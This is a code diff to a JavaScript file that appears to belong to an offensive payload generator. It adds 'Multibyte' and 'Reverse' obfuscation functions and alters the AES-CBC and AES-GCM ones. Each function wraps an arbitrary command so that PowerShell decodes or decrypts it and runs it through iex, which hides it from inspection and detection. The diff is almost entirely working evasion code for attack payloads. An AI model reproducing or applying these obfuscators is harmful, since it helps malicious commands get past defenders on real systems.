@@ -58,7 +58,7 @@ async function obfsAesCbc(payload, cli) {
         const encPayloadBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
         const keyBase64 = btoa(String.fromCharCode(...keyArray));
         const ivBase64 = btoa(String.fromCharCode(...iv));
-        return `$encBytes = [Convert]::FromBase64String("${encPayloadBase64}");$aes = [System.Security.Cryptography.Aes]::Create();$aes.Key = $([Convert]::FromBase64String("${keyBase64}"));$aes.IV = $([Convert]::FromBase64String("${ivBase64}"));$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$decryptor = $aes.CreateDecryptor();$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);iex $([System.Text.Encoding]::UTF8.GetString($decBytes));Remove-Variable -Name "encBytes";Remove-Variable -Name "aes";Remove-Variable -Name "decryptor";Remove-Variable -Name "decBytes"`;
+        return `$encBytes = [Convert]::FromBase64String("${encPayloadBase64}");$aes = [System.Security.Cryptography.Aes]::Create();$aes.Key = $([Convert]::FromBase64String("${keyBase64}"));$aes.IV = $([Convert]::FromBase64String("${ivBase64}"));$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$decryptor = $aes.CreateDecryptor();$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);iex $([System.Text.Encoding]::UTF8.GetString($decBytes))`;
     }
 }
 
@@ -92,7 +92,7 @@ async function obfsAesGcm(payload, cli) {
         const nonceBase64 = btoa(String.fromCharCode(...nonce));
         const authTagBase64 = btoa(String.fromCharCode(...authTag));
         const encPayloadBase64 = btoa(String.fromCharCode(... new Uint8Array(encPayload)));
-        return `$encPayload = [Convert]::FromBase64String("${encPayloadBase64}");$key = [Convert]::FromBase64String("${keyBase64}");$nonce = [Convert]::FromBase64String("${nonceBase64}");$authTag = [Convert]::FromBase64String("${authTagBase64}");$payload = New-Object byte[] ($encPayload.Length);$aes = [System.Security.Cryptography.AesGcm]::new($key);$aes.Decrypt($nonce, $encPayload, $authTag, $payload);iex $([System.Text.Encoding]::UTF8.GetString($payload));Remove-Variable -Name "encPayload";Remove-Variable -Name "key";Remove-Variable -Name "nonce";Remove-Variable -Name "authTag";Remove-Variable -Name "aes";Remove-Variable -Name "payload"`;
+        return `$encPayload = [Convert]::FromBase64String("${encPayloadBase64}");$key = [Convert]::FromBase64String("${keyBase64}");$nonce = [Convert]::FromBase64String("${nonceBase64}");$authTag = [Convert]::FromBase64String("${authTagBase64}");$payload = New-Object byte[] ($encPayload.Length);$aes = [System.Security.Cryptography.AesGcm]::new($key);$aes.Decrypt($nonce, $encPayload, $authTag, $payload);iex $([System.Text.Encoding]::UTF8.GetString($payload))`;
     }
 }
 
@@ -113,10 +113,35 @@ function obfsBase64Python(payload, cli) {
     }
 }
 
+function obfsMultibyte(payload, cli) {
+    let unicodePayload = "";
+
+    if (cli === 'Command Prompt') {
+        return `# No available on Command Prompt`;
+    } else {
+        for (i = 0; i < payload.length; i++) {
+            unicodePayload += '[char]0x' + payload.charCodeAt(i).toString(16).padStart(2, '0');
+            if (i < payload.length - 1) {
+                unicodePayload += ' + ';
+            }
+        }
+        return `iex $(${unicodePayload})`;
+    }
+}
+
+function obfsReverse(payload, cli) {
+    if (cli === 'Command Prompt') {
+        return '# No available on Command Prompt';
+    } else {
+        const reversedPayload = payload.split('').reverse().join('');
+        return `$reversed = '${reversedPayload}'.ToCharArray();[Array]::Reverse($reversed);iex(-join $reversed)`;
+    }
+}
+
 function obfsSplit(payload, cli) {
     chars = []
     for (i = 0; i < payload.length; i++) {
-        if (payload[i] == ' ') {
+        if (payload[i] === ' ') {
             chars.push("' '");
         } else if (payload[i] == '\'' || payload[i] == '"') {
             chars.push("'\"'");
@@ -144,6 +169,10 @@ async function obfs(payload, cli, optObfs) {
             return obfsBase64(payload, cli);
         case 'Base64 (Python)':
             return obfsBase64Python(payload, cli);
+        case 'Multibyte':
+            return obfsMultibyte(payload, cli);
+        case 'Reverse':
+            return obfsReverse(payload, cli);
         case 'Split':
             return obfsSplit(payload, cli);
         default:
